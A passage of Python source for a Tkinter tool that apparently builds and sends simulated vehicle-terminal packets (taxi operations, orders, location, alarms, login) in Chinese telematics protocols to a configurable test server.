                        s.send(bytes().fromhex(data))
                        send = s.recv(1024).hex()
                        print(send.upper())
                        print('\n' * 1)
                        tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                        self.result_data_Text1.insert(1.0, tip_content)
                showinfo("发送结果", "总计发送成功营运数据条数:  {}".format(str(count)))
            else:
                ISU标识 = self.sb_hao().zfill(12)
                当前车次 = f'{2}'.zfill(8)
                w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 报警 + 状态 + 纬度 + 经度 + 速度 + 方向 + 时间 + 报警1 + 状态1 + 纬度1 + 经度1 + 速度1 + 方向1 + 时间1 + 营运ID + 评价ID + 评价选项 + 评价选项扩展 + 电召订单ID + 车牌号 + 企业经营许可证号 + 驾驶员从业资格证号 + 上车时间1 + 下车时间 + 计程公里数 + 空驶里程 + 附加费 + 等待计时时间 + 交易金额 + 当前车次 + 交易类型 + 附加
                a = get_xor(w)
                b = get_bcc(a)
                E = w + b.upper().zfill(2)
                t = 标识位 + E.replace("7E", "00") + 标识位
                D = get_xor(E)
                data = '7E ' + D + ' 7E'
                if data[:2] != "7E":
                    print(f"错误：{data}")
                    t = t[:81] + "00" + t[82:]
                    data = get_xor(t)
                    print("修改后data：{}".format(data))
                    print('\n' * 1)
                print(t)
                print(data)
                count += 1
                tip_content = '\n营运数据：\n{}\n源数据：{}\n'.format(data, t)
                self.result_data_Text1.insert(1.0, tip_content)
                time.sleep(float(self.times()))
                if self.ip_on() == '是':
                    s = socket(AF_INET, SOCK_STREAM)
                    s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                    s.connect((f'{self.ip()}', int(self.port())))  # 生产
                    s.send(bytes().fromhex(data))
                    send = s.recv(1024).hex()
                    print(send.upper())
                    print('\n' * 1)
                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                    self.result_data_Text1.insert(1.0, tip_content)
                    showinfo("发送结果", "总计发送成功营运数据条数:  {}".format(str(count)))
        except:
            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        self.result_data_Text1.insert(1.0, "总计发送成功营运数据条数:{}\n\n".format(str(count)))
        return ""

    # 抢答订单
    def qda(self, su3):
        count = 0
        for i in range(int(su3)):
            try:
                标识位 = '7E'
                消息ID = '0B01'
                消息体属性 = '002F'
                ISU标识 = self.sb_hao3()
                流水号 = f'{1}'.zfill(4)
                业务ID = f'{self.yewid()}'.zfill(8).upper()
                print(业务ID)
                w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 业务ID
                a = get_xor(w)
                b = get_bcc(a)
                t = 标识位 + w + b.upper() + 标识位
                data = get_xor(t)
                print(t)
                print(data)
                tip_content = '\n抢单数据：\n{}\n源数据：{}\n'.format(data, t)
                self.result_data_Text3.insert(1.0, tip_content)
                time.sleep(2)
                count += 1
                if self.ip_on3() == '是':
                    s = socket(AF_INET, SOCK_STREAM)
                    s.connect((f'{self.ip3()}', int(self.port3())))  # 生产
                    s.send(bytes().fromhex(data))
                    send = s.recv(1024).hex()
                    print(send.upper())
                    print('\n' * 1)
                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                    self.result_data_Text3.insert(1.0, tip_content)
                    showinfo("发送结果", "总计发送成功抢单数据条数:  {}".format(str(count)))
                else:
                    continue
            except:
                return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        self.result_data_Text3.insert(1.0, "总计发送成功抢单数据条数:{}\n\n".format(str(count)))
        return ""

    def qr(self, su3):
        count = 0
        for i in range(int(su3)):
            try:
                标识位 = '7E'
                消息ID = '0B07'
                消息体属性 = '002F'
                ISU标识 = self.sb_hao3()
                流水号 = f'{i}'.zfill(4)
                业务ID = f'{self.yewid()}'.zfill(8).upper()
                w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 业务ID
                a = get_xor(w)
                b = get_bcc(a)
                t = 标识位 + w + b.upper() + 标识位
                data = get_xor(t)
                print(t)
                print(data)
                tip_content = '\n完成订单数据：\n{}\n源数据：{}\n'.format(data, t)
                self.result_data_Text3.insert(1.0, tip_content)
                time.sleep(2)
                count += 1
                if self.ip_on3() == '是':
                    s = socket(AF_INET, SOCK_STREAM)
                    s.connect((f'{self.ip3()}', int(self.port3())))  # 生产
                    s.send(bytes().fromhex(data))
                    send = s.recv(1024).hex()
                    print(send.upper())
                    print('\n' * 1)
                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                    self.result_data_Text3.insert(1.0, tip_content)
                    showinfo("发送结果", "总计发送成功完成订单数据条数:  {}".format(str(count)))
                else:
                    continue
            except:
                return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        self.result_data_Text3.insert(1.0, "总计发送成功完成订单数据条数:{}\n\n".format(str(count)))
        return ""

    def qx(self, su3):
        count = 0
        for i in range(int(su3)):
            try:
                标识位 = '7E'
                消息ID = '0B08'
                消息体属性 = '002F'
                ISU标识 = self.sb_hao3()
                流水号 = f'{i}'.zfill(4)
                业务ID = f'{self.yewid()}'.zfill(8).upper()
                取消原因 = '01'
                w = 消息ID + 消息体属性 + ISU标识 + 流水号 + 业务ID + 取消原因
                a = get_xor(w)
                b = get_bcc(a)
                t = 标识位 + w + b.upper() + 标识位
                data = get_xor(t)
                print(t)
                print(data)
                tip_content = '\n取消订单数据：\n{}\n源数据：{}\n'.format(data, t)
                self.result_data_Text3.insert(1.0, tip_content)
                time.sleep(2)
                count += 1
                if self.ip_on3() == '是':
                    s = socket(AF_INET, SOCK_STREAM)
                    s.connect((f'{self.ip3()}', int(self.port3())))  # 生产
                    s.send(bytes().fromhex(data))
                    send = s.recv(1024).hex()
                    print(send.upper())
                    print('\n' * 1)
                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                    self.result_data_Text3.insert(1.0, tip_content)
                    showinfo("发送结果", "总计发送成功取消订单数据条数:  {}".format(str(count)))
                else:
                    continue
            except:
                return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
            self.result_data_Text3.insert(1.0, "总计发送成功取消订单数据条数:{}\n\n".format(str(count)))
            return ""

    def wzhi2929(self, su4):
        count = 0
        for i in range(int(su4)):
            try:
                print(count)
                now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
                wd2 = float(self.wd4()) / 0.00001
                print(str(int(wd2)))
                jd2 = float(self.jd4()) / 0.00001
                print(str(int(jd2)))
                标识位 = '2929'
                消息ID = '80'
                消息体属性 = '0028'
                伪ip = self.sb_hao4().zfill(8)
                时间 = now_time[2:]
                纬度 = str(int(wd2)).zfill(8)
                经度 = str(int(jd2)).zfill(8)
                速度 = self.sdu4().zfill(4).upper()
                方向 = self.fx().zfill(4).upper()
                定位 = 'F0'
                附加信息ID = '000000FEFC0000001E000000000000'
                w = 消息ID + 消息体属性 + 伪ip + 时间 + 纬度 + 经度 + 速度 + 方向 + 定位 + 附加信息ID
                a = get_xor(w)
                b = get_bcc(a).zfill(2)
                E = w + b.upper()
                t = 标识位 + E.replace("7E", "00") + '0D'
                print(t)
                data = get_xor(t)
                count += 1

                tip_content = '\n位置数据：\n{}\n源数据：\n{}\n'.format(data, t)
                self.result_data_Text4.insert(1.0, tip_content)
                time.sleep(float(self.times4()))
                if self.ip_on4() == '是':
                    s = socket(AF_INET, SOCK_DGRAM)
                    s.settimeout(5)
                    s.connect((f'{self.ip4()}', int(self.port4())))  # 生产
                    s.send(bytes().fromhex(data))
                    send = s.recv(1024).hex()
                    print(send.upper())
                    print('\n' * 1)
                    tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                    self.result_data_Text4.insert(1.0, tip_content)
                    showinfo("发送结果", "总计发送成功位置数据条数:  {}".format(str(count)))
                else:
                    continue
            except:
                return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        self.result_data_Text4.insert(1.0, "总计发送成功位置数据条数:{}\n".format(str(count)))
        return ""

    def shebeihao2Vip(self, sSim):
        if sSim is None or sSim == "":
            return None
        try:
            sTemp = []
            sIp = []
            if len(sSim) == 11:
                sTemp.append(int(sSim[3:5]))
                sTemp.append(int(sSim[5:7]))
                sTemp.append(int(sSim[7:9]))
                sTemp.append(int(sSim[9:11]))
                iHigt = int(sSim[1:3]) - 30
            elif len(sSim) == 10:
                sTemp.append(int(sSim[2:4]))
                sTemp.append(int(sSim[4:6]))
                sTemp.append(int(sSim[6:8]))
                sTemp.append(int(sSim[8:10]))
                iHigt = int(sSim[0:2]) - 30
            elif len(sSim) == 9:
                sTemp.append(int(sSim[1:3]))
                sTemp.append(int(sSim[3:5]))
                sTemp.append(int(sSim[5:7]))
                sTemp.append(int(sSim[7:9]))
                iHigt = int(sSim[0:1])
            elif len(sSim) < 9:
                sSim = "140" + sSim.zfill(8)
                sTemp.append(int(sSim[3:5]))
                sTemp.append(int(sSim[5:7]))
                sTemp.append(int(sSim[7:9]))
                sTemp.append(int(sSim[9:11]))
                iHigt = int(sSim[1:3]) - 30
            else:
                return None
            if (iHigt & 0x8) != 0:
                sIp.append(sTemp[0] | 128)
            else:
                sIp.append(sTemp[0])
            if (iHigt & 0x4) != 0:
                sIp.append(sTemp[1] | 128)
            else:
                sIp.append(sTemp[1])
            if (iHigt & 0x2) != 0:
                sIp.append(sTemp[2] | 128)
            else:
                sIp.append(sTemp[2])
            if (iHigt & 0x1) != 0:
                sIp.append(sTemp[3] | 128)
            else:
                sIp.append(sTemp[3])
            ipstr = ""
            for ip in sIp:
                ss = str(hex(ip))[2:].zfill(2)
                ipstr += ss
            print(ipstr.upper())
            return ipstr.upper()
        except Exception as e:
            print("设备号转伪ip失败！原因：%s" % e)
            return self.result_data_Text4.insert(1.0, "设备号转伪ip失败！原因：{}".format(e))

    def sb_hao4(self):
        sb = self.sbei_Text4.get().strip()
        sb1 = self.shebeihao2Vip(sb)
        return sb1

    def wd4(self):
        wd = self.wd_Text4.get().strip()
        return wd

    def jd4(self):
        jd = self.jd_Text4.get().strip()
        return jd

    def su4(self):
        su = self.su_Text4.get().strip()
        return su

    def ip4(self):
        ip = self.ip_Text4.get().strip()
        return ip

    def port4(self):
        port = self.port_Text4.get().strip()
        return port

    def sdu4(self):
        sdu = self.sdu_Text4.get().strip()
        return sdu

    def fx(self):
        fx = self.fx_Text.get().strip()
        return fx

    def times4(self):
        times = self.times_Text4.get().strip()
        return times

    def button_mode4(self):
        global is_on

        wd1 = get_latitude(base_lat=float(self.wd4()), radius=150)
        jd1 = get_longitude(base_log=float(self.jd4()), radius=150)
        wd2 = float(wd1)
        jd2 = float(jd1)
        self.wd_Text4.delete(0, END)
        self.wd_Text4.insert(0, str(wd2))
        self.jd_Text4.delete(0, END)
        self.jd_Text4.insert(0, str(jd2))

    def ip_on4(self):
        ip_on = self.ip_on_Text4.get().strip()
        return ip_on

    def sb_hao3(self):
        sb = self.sbei_Text3.get().strip()
        return sb

    def ip3(self):
        ip = self.ip_Text3.get().strip()
        return ip

    def port3(self):
        port = self.port_Text3.get().strip()
        return port

    def su3(self):
        su = self.su_Text3.get().strip()
        return su

    def ip_on3(self):
        ip_on = self.ip_on_Text3.get().strip()
        return ip_on

    def yewid(self):
        yewid = self.yewid_Text3.get().strip()
        if not yewid:
            self.result_data_Text3.delete(1.0, END)
            self.result_data_Text3.insert(1.0, '请输入业务ID\n')
        else:
            yewid = hex(int(yewid))[2:]
            return yewid

    def str_trans_to_md5(self):
        src = self.init_data1_Text5.get(1.0, END).strip()
        return src

    def thread_it(self, func, *args):
        """ 将函数打包进线程 """
        self.myThread = threading.Thread(target=func, args=args)
        self.myThread.setDaemon(True)  # 主线程退出就直接让子线程跟随退出,不论是否运行完成。
        self.myThread.start()

    def sb_hao(self):
        sb = self.sbei_Text.get().strip()
        return sb

    def baoget(self):
        self.result905_Text9.delete(1.0, END)
        self.result905_Text9.insert(1.0, login().get())

    def baoget1(self):
        self.result905_Text9.delete(1.0, END)
        self.result905_Text9.insert(1.0, login().get1())

    def baoget2(self):
        self.result905_Text9.delete(1.0, END)
        self.result905_Text9.insert(1.0, login().get2())

    def baoget3(self):
        self.result905_Text9.delete(1.0, END)
        self.result905_Text9.insert(1.0, login().get3())

    def baoget4(self):
        self.result905_Text9.delete(1.0, END)
        self.result905_Text9.insert(1.0, login().get4())

    def baoget5(self):
        self.result905_Text9.delete(1.0, END)
        self.result905_Text9.insert(1.0, login().get5())

    def baoget6(self):
        self.result905_Text9.delete(1.0, END)
        self.result905_Text9.insert(1.0, login().get6())

    def baoget7(self):
        self.result905_Text9.delete(1.0, END)
        self.result905_Text9.insert(1.0, login().get7())

    def baojhe(self):
        self.result905_Text9.delete(1.0, END)
        count = 0
        max_count = 1
        while count < max_count:
            count += 1
            self.result905_Text9.insert(1.0, login().get())
            countdown(4)
            self.result905_Text9.insert(1.0, login().get1())
            countdown(4)
            self.result905_Text9.insert(1.0, login().get2())
            countdown(4)
            self.result905_Text9.insert(1.0, login().get3())
            countdown(4)
            self.result905_Text9.insert(1.0, login().get4())
            countdown(4)
            self.result905_Text9.insert(1.0, login().get5())
            countdown(4)
            self.result905_Text9.insert(1.0, login().get6())
            countdown(4)
            self.result905_Text9.insert(1.0, login().get7())
            countdown(4)
        showinfo("发送结果", "发送成功")

    def sb_bj(self):
        sb = self.baoji_Text.get()
        if sb == "紧急报警":
            return '00000001'
        elif sb == "危险预警":
            return '00000002'
        elif sb == "定位模块故障":
            return '00000004'
        elif sb == "定位天线开路":
            return '00000008'
        elif sb == "定位天线短路":
            return '00000010'
        elif sb == "终端主电源欠压":
            return '00000020'
        elif sb == "终端主电源掉电":
            return '00000040'
        elif sb == "液晶LCD显示故障":
            return '00000080'
        elif sb == "语音模块TTS故障":
            return '00000100'
        elif sb == "摄像头故障":
            return '00000200'
        elif sb == "超速报警":
            return '00010000'
        elif sb == "疲劳驾驶":
            return '00020000'
        elif sb == "当天累计驾驶超时":
            return '00040000'
        elif sb == "超时停车":
            return '00080000'
        elif sb == "车速传感器故障":
            return '00800000'
        elif sb == "录音设备故障":
            return '08000000'
        elif sb == "计价器故障":
            return '00000400'
        elif sb == "服务评价器故障":
            return '00000800'
        elif sb == "LED广告屏故障":
            return '00001000'
        elif sb == "液晶LED显示屏故障":
            return '00002000'
        elif sb == "安全访问模块故障":
            return '00004000'
        elif sb == "LED顶灯故障":
            return '00008000'
        elif sb == "计价器实时时钟":
            return '10000000'
        elif sb == "进出区域路线报警":
            return '00100000'
        elif sb == "路段行驶时间不足":
            return '00200000'
        elif sb == "禁行路段行驶":
            return '00400000'
        elif sb == "车辆非法点火":
            return '01000000'
        elif sb == "车辆非法位移":
            return '02000000'
        elif sb == "所有实时报警":
            return '03700000'
        elif sb == "紧急报警和超速报警":
            return '00010001'
        elif sb == "正常":
            return '00000000'

    def wd(self):
        wd = self.wd_Text.get().strip()
        return wd

    def jd(self):
        jd = self.jd_Text.get().strip()
        return jd

    def su(self):
        su = self.su_Text.get().strip()
        return su

    def plsu(self):
        plsu = self.plsu_Text.get().strip()
        return plsu

    def sdu(self):
        sdu = self.sdu_Text.get().strip()
        sdu1 = hex(int(sdu) * 10)
        return sdu1

    def ip(self):
        ip = self.ip_Text.get().strip()
        return ip

    def port(self):
        port = self.port_Text.get().strip()
        return port

    def driver(self):
        driver = self.driver_Text.get().strip()
        return driver

    def times(self):
        times = self.times_Text.get().strip()
        print(times)
        return times

    def ip_on(self):
        ip_on = self.ip_on_Text.get().strip()
        return ip_on

    def sb_on(self):
        sb_on = self.sb_on_Text.get().strip()
        return sb_on

    def sb_on2(self):
        sb_on2 = self.sb_on_Text2.get().strip()
        return sb_on2

    def sb_hao2(self):
        sb = self.sbei_Text2.get().strip()
        return sb

    def sb_hao8(self):
        sb = self.sbei_Text8.get().strip()
        return sb

    def sb905_hao8(self):
        sb = self.sbei905_Text8.get().strip()
        return sb

    def count8(self):
        sb = self.count_Text8.get().strip()
        return int(sb)

    def count905_8(self):
        sb = self.count905_Text8.get().strip()
        return int(sb)

    def 标志位(self):
        标志位 = self.init_data4_Text7.get().strip()
        if 标志位 == '开始':
            return '01'
        else:
            return '02'

    def 主动报警(self):
        主动报警 = self.init_data3_Text7.get().strip()
        if 主动报警 == '疲劳驾驶报警':
            return '01'
        elif 主动报警 == '接打手持电话报警':
            return '02'
        elif 主动报警 == '抽烟报警':
            return '03'
        elif 主动报警 == '长时间不目视前方报警':
            return '04'
        elif 主动报警 == '未检测到驾驶员报警':
            return '05'
        elif 主动报警 == '双手同时脱离方向盘报警':
            return '06'
        elif 主动报警 == '驾驶员行为监测功能失效报警':
            return '07'
        elif 主动报警 == '探头遮挡报警':
            return '06'
        elif 主动报警 == '双脱把报警（双手同时脱离方向盘）':
            return '07'

    def sb_ztai2(self):
        ztai = self.ztai_Text2.get().strip()
        if ztai == "ACC开":
            return "00000001"
        elif ztai == "定位":
            return '00000002'
        elif ztai == "南纬":
            return '00000004'
        elif ztai == "ACC开和定位":
            return '00000003'
        elif ztai == "西经":
            return '00000008'
        elif ztai == "停运状态":
            return '00000010'
        elif ztai == "经纬度已经保密插件保密":
            return '00000020'
        elif ztai == "单北斗":
            return '00000040'
        elif ztai == "单GPS":
            return '00000080'
        elif ztai == "北斗GPS双模":
            return '000000C0'
        elif ztai == "ACC开定位开北斗GPS空车":
            return '000000C3'
        elif ztai == "ACC开定位开北斗GPS满载":
            return '000003C3'
        elif ztai == "车辆油路断开":
            return '00000403'
        elif ztai == "车辆电路断开":
            return '00000803'
        elif ztai == "车门加锁":
            return '00001003'

    def sb_bj2(self):
        sb = self.baoji_Text2.get()
        if sb == "紧急报警":
            return '00000001'
        elif sb == "超速报警":
            return '00000002'
        elif sb == "疲劳驾驶":
            return '00000004'
        elif sb == "危险预警":
            return '00000008'
        elif sb == "模块故障":
            return '00000010'
        elif sb == "模块开路":
            return '00000040'
        elif sb == "终端欠压":
            return '00000080'
        elif sb == "终端掉电":
            return '00000100'
        elif sb == "终端LCD故障":
            return '00000200'
        elif sb == "TTS故障":
            return '00000400'
        elif sb == "摄像头故障":
            return '00000800'
        elif sb == "道路运输证IC卡模块故障":
            return '00001000'
        elif sb == "超速预警":
            return '00002000'
        elif sb == "疲劳驾驶预警":
            return '00004000'
        elif sb == "当天累计驾驶时长":
            return '00040000'
        elif sb == "超时停车":
            return '00080000'
        elif sb == "进出区域":
            return '00100000'
        elif sb == "进出路线":
            return '00200000'
        elif sb == "路段行驶时间不足":
            return '00400000'
        elif sb == "路线偏离报警":
            return '00800000'
        elif sb == "车辆VSS故障":
            return '01000000'
        elif sb == "车辆油量异常":
            return '02000000'
        elif sb == "车辆被盗":
            return '04000000'
        elif sb == "车辆非法点火":
            return '08000000'
        elif sb == "车辆非法位移":
            return '10000000'
        elif sb == "碰撞预警":
            return '20000000'
        elif sb == "侧翻预警":
            return '40000000'
        elif sb == "非法开门报警":
            return '80000000'
        elif sb == "所有实时报警":
            return 'FFFCFFFF'
        elif sb == "正常":
            return '00000000'

    def wd部标(self):
        wd = self.wd_Text2.get().strip()
        return wd

    def jd部标(self):
        jd = self.jd_Text2.get().strip()
        return jd

    def su2(self):
        su = self.su_Text2.get().strip()
        return su

    def plsu2(self):
        plsu2 = self.plsu2_Text2.get().strip()
        return plsu2

    def ip2(self):
        ip = self.ip_Text2.get().strip()
        return ip

    def port2(self):
        port = self.port_Text2.get().strip()
        return port

    def ip8(self):
        ip = self.ip_Text8.get().strip()
        return ip

    def port8(self):
        port = self.port_Text8.get().strip()
        return port

    def port905_8(self):
        port = self.port905_Text8.get().strip()
        return port

    def sdu2(self):
        sdu = self.sdu_Text2.get().strip()
        sdu1 = hex(int(sdu) * 10)
        return sdu1

    def lic(self):
        lic = self.lic_Text.get().strip()
        hex_num = hex(int(float(lic) * 10))
        return hex_num[2:].upper()

    def lic1(self):
        lic = self.lic_Text1.get().strip()
        hex_num = hex(int(float(lic) * 10))
        return hex_num[2:].upper()

    def times2(self):
        times = self.times_Text2.get().strip()
        return times

    def ip_on2(self):
        ip_on = self.ip_on_Text2.get().strip()
        return ip_on

    def button_mode2(self):
        global is_on
        wd1 = get_latitude(base_lat=float(self.wd部标()), radius=100)
        jd1 = get_longitude(base_log=float(self.jd部标()), radius=100)
        self.wd_Text2.delete(0, END)
        self.wd_Text2.insert(0, wd1)
        self.jd_Text2.delete(0, END)
        self.jd_Text2.insert(0, jd1)

    def getMon(self, items):
        inits = self.init_data_Text1.get()
        if inits == "2" or inits == "3" or inits == "4":
            items = (f"{self.conf_驾驶员从业资格证号['高先生']}", f"{self.conf_驾驶员从业资格证号['欧先生']}")
        else:
            pass
        self.driver_Text["values"] = items

    def getMon1(self, items):
        inits = self.init_data2_Text7.get().strip()
        if inits == "苏标":
            items = ("疲劳驾驶报警", "接打手持电话报警", "抽烟报警", "长时间不目视前方报警", "未检测到驾驶员报警",
                     "双手同时脱离方向盘报警", "驾驶员行为监测功能失效报警")
        else:
            items = ("疲劳驾驶报警", "接打手持电话报警", "抽烟报警", "长时间不目视前方报警", "未检测到驾驶员报警",
                     "探头遮挡报警", "双脱把报警（双手同时脱离方向盘）")
        self.init_data3_Text7["values"] = items

    def show_menu(self, event):
        self.init_window_name.menu.post(event.x_root, event.y_root)

    def topmost_on(self):
        if self.init_window_name.attributes('-topmost'):
            self.init_window_name.attributes('-topmost', False)
            self.init_window_name.menu.entryconfig(1, label='窗口置顶')
        else:
            self.init_window_name.attributes('-topmost', True)
            self.init_window_name.menu.entryconfig(1, label='取消置顶')

    def choose_color(self):
        color = askcolor()[1]
        if color:
            self.init_window_name.config(bg=color)
            self.init_window_name.set_value_to_registry('background_color', color)

    def zhuti(self):
        theme_names = s.theme_names()  # 以列表的形式返回多个主题名
        print(theme_names)
        theme_selection = Toplevel(self.init_window_name)
        theme_selection.title("选择主题")
        theme_selection.geometry('450x70+750+400')
        label = Label(theme_selection, text="主题选择")
        label.grid(row=0, column=0)
        theme_cbo = ttk.Combobox(
            master=theme_selection,
            text=s.theme.name,
            values=theme_names,
            width=60, height=20,
        )
        theme_cbo.grid(row=1, column=0)

        def change_theme(event):
            theme_cbo_value = theme_cbo.get()
            s.theme_use(theme_cbo_value)
            theme_cbo.selection_clear()

        theme_cbo.bind('<<ComboboxSelected>>', change_theme)

    def tm(self):
        def confirm():
            value = input_entry.get().strip()
            if value:
                value = int(value) * float("0.1")
                self.init_window_name.attributes('-alpha', value)  # 设置窗口透明度

        input_dialog = Toplevel(self.init_window_name)
        input_dialog.title("窗口透明度设置")
        input_dialog.geometry('380x77+750+400')
        input_label = Label(input_dialog, text="透明度值：(%)")
        input_label.grid(row=0, column=0)
        items = ("1", "2", "3", "4", "5", "6", "7", "8", "9")
        input_entry = Combobox(input_dialog, width=50, values=items)
        input_entry.grid(row=1, column=0)
        input_entry.current(5)
        confirm_button = tk.Button(input_dialog, text="确认", command=confirm)
        confirm_button.grid(row=2, column=0)

    def sb_ztai(self):
        ztai = self.ztai_Text.get().strip()
        if ztai == "未卫星定位":
            return "00000001"
        elif ztai == "南纬":
            return '00000002'
        elif ztai == "西经":
            return '00000004'
        elif ztai == "停运状态":
            return '00000008'
        elif ztai == "预约任务车":
            return '00000010'
        elif ztai == "空转重":
            return '00000020'
        elif ztai == "重转空":
            return '00000040'
        elif ztai == "ACC开":
            return '00000100'
        elif ztai == "重车":
            return '00000200'
        elif ztai == "车辆油路断开":
            return '00000400'
        elif ztai == "车辆电路断开":
            return '00000800'
        elif ztai == "车门加锁":
            return '00001000'
        elif ztai == "车辆锁定":
            return '00002000'
        elif ztai == "已达到限制营运次数时间":
            return '00004000'
        elif ztai == "ACC开和载客":
            return '00000300'

    def button_mode(self):
        global is_on

        wd1 = get_latitude(base_lat=float(self.wd()), radius=100)
        jd1 = get_longitude(base_log=float(self.jd()), radius=100)
        self.wd_Text.delete(0, END)
        self.wd_Text.insert(0, wd1)
        self.jd_Text.delete(0, END)
        self.jd_Text.insert(0, jd1)

    def get_current_time5(self):
        current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
        return current_time

    # def write_log_to_Text4(self, logmsg):
    #     global LOG_LINE_NUM
    #     current_time = self.get_current_time4()
    #     logmsg_in = str(current_time) + " " + str(logmsg) + "\n"  # 换行
    #     if LOG_LINE_NUM <= 7:
    #         self.log_data_Text4.insert(END, logmsg_in)
    #         LOG_LINE_NUM = LOG_LINE_NUM + 1
    #     else:
    #         self.log_data_Text4.delete(1.0, 2.0)
    #         self.log_data_Text4.insert(END, logmsg_in)

    def sb_hao5(self):
        sb = self.sbei_Text5.get().strip()
        return sb

    def qo_ddan(self):
        src = self.init_data_Text3.get().strip()
        print(src)
        if src == '1':
            sbb1 = self.sb_hao3()
            if not sbb1:
                self.result_data_Text3.delete(1.0, END)
                self.result_data_Text3.insert(1.0, "请输入订单类型")
            else:
                self.result_data_Text3.delete(1.0, END)
                self.result_data_Text3.insert(END, self.qda(self.su3()))
            # return 0
        elif src == '2':
            sbb1 = self.sb_hao3()
            if not sbb1:
                self.result_data_Text3.delete(1.0, END)
                self.result_data_Text3.insert(1.0, "请输入订单类型")
            else:
                self.result_data_Text3.delete(1.0, END)
                self.result_data_Text3.insert(END, self.qx(self.su3()))
        elif src == '3':
            sbb1 = self.sb_hao3()
            if not sbb1:
                self.result_data_Text3.delete(1.0, END)
                self.result_data_Text3.insert(1.0, "请输入订单类型")
            else:
                self.result_data_Text3.delete(1.0, END)
                self.result_data_Text3.insert(END, self.qr(self.su3()))

    def ip5(self):
        ip = self.ip_Text5.get().strip()
        return ip

    def port5(self):
        port = self.port_Text5.get().strip()
        return port

    def ip_on5(self):
        ip_on = self.ip_on_Text5.get().strip()
        return ip_on

    def login5(self):
        try:

            qsw = '7878'
            bcd1 = '17'
            bcd = hex(int(bcd1))[2:].upper()
            xyh = '01'
            zdid = '0' + self.sb_hao5()
            lxsbh = '0100'
            sqyy = '3200'
            xxxlh = '0001'
            cwjy = bcd + xyh + zdid + lxsbh + sqyy + xxxlh
            cwjy1 = crc1(cwjy)[2:].zfill(4).upper()
            tzw = '0D0A'
            w = qsw + cwjy + cwjy1 + tzw
            data = get_xor(w)
            print(data)
            tip_content = 'V3登录包数据：\n{}\n\n设备号：{}\n\n源数据：{}\n'.format(data, data[12:-30], w)
            self.result_data_Text5.insert(1.0, tip_content)
            if self.ip_on5() == '是':
                s = socket(AF_INET, SOCK_STREAM)
                s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
                s.connect((f'{self.ip5()}', int(self.port5())))  # 生产
                s.send(bytes().fromhex(data))
                send = s.recv(1024).hex()
                print(send.upper())
                print('\n' * 1)
                tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                self.result_data_Text5.insert(1.0, tip_content)
                showinfo("发送结果", "发送成功")
        except:
            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        return ""

    def dwei5(self):
        try:
            qsw = '7878'
            ti = time.strftime("%Y%m%d%H%M%S")
            ti2 = str(ti)
            ti3 = 2 * '' + ti2[2:]
            ti4 = (hex(int(ti3[0:2]))[2:4]).zfill(2)
            ti5 = (hex(int(ti3[2:4]))[2:4]).zfill(2)
            ti6 = (hex(int(ti3[4:6]))[2:4]).zfill(2)
            ti7 = (hex(int(ti3[6:8]) - 8)[2:4]).zfill(2)
            ti8 = (hex(int(ti3[8:10]))[2:4]).zfill(2)
            ti9 = (hex(int(ti3[10:12]))[2:4]).zfill(2)
            ti10 = ti4 + ti5 + ti6 + ti7 + ti8 + ti9
            ti10 = ti10.upper()
            cwjy = '22' + '22' + ti10 + f'CF027AC7EB0C46584911D54C01CC00287D001FB80001000007'
            cwjy1 = crc1(cwjy)[2:].zfill(4).upper()
            tzw = '0D0A'
            w = qsw + cwjy + cwjy1 + tzw
            a = get_xor(w)
            t = a + ''
            print(t)

            tip_content = 'V3定位包数据：{}\n\n源数据：{}\n'.format(t, w)
            self.result_data_Text5.insert(1.0, tip_content)
            if self.ip_on5() == '是':
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((f'{self.ip5()}', int(self.port5())))  # 生产
                s.send(bytes().fromhex(t))
                send = s.recv(1024).hex()
                print(send.upper())
                print('\n' * 1)
                tip_content = '服务器应答：\n{}\n\n'.format(send.upper())
                self.result_data_Text5.insert(1.0, tip_content)
                showinfo("发送结果", "发送成功")
        except:
            return "数据解析有误，查看是否数据填写错误，修改无误后，请重新点击生成数据"
        return ""

    def beep5(self):
        try:
            qsw = '7878'
            bcd1 = '37'
            bcd = hex(int(bcd1))[2:].upper()
            xyh = '26'
            ti = time.strftime("%Y%m%d%H%M%S")
            ti2 = str(ti)
            ti3 = 2 * '' + ti2[2:]
            ti4 = (hex(int(ti3[0:2]))[2:4]).zfill(2)
            ti5 = (hex(int(ti3[2:4]))[2:4]).zfill(2)
            ti6 = (hex(int(ti3[4:6]))[2:4]).zfill(2)
            ti7 = (hex(int(ti3[6:8]) - 8)[2:4]).zfill(2)
            ti8 = (hex(int(ti3[8:10]))[2:4]).zfill(2)
            ti9 = (hex(int(ti3[10:12]))[2:4]).zfill(2)
            ti10 = ti4 + ti5 + ti6 + ti7 + ti8 + ti9
            ti10 = ti10.upper()
            gpscd = '12'
            gpscd1 = hex(int(gpscd))[2:].upper()
            gpsgs = '11'
            gpsgs1 = hex(int(gpsgs))[2:].upper()
            gps = gpscd1 + gpsgs1
            wd = '026DDEC0'
            jd = '0C3BFEE6'
            sd = '25'
            hxzt = '1400'
            lbscd = '08'
            mcc = '01CC'
            mnc = '00'
            lac = '262C'
            cellid = '000EBA'
            zdxxnrs = ["4C", "54", "64", "44", "74"]
            zdxxnr = random.choice(zdxxnrs)
            dydj = '03'
            gsm = '03'
            bjs = ["03", "00", "02", "04", "05", "06", "0D", "0E", "09", "01", "11", "12", "10", "0A", "0C", "0F",
                   "40",
                   "41", "42", "43", "44"]
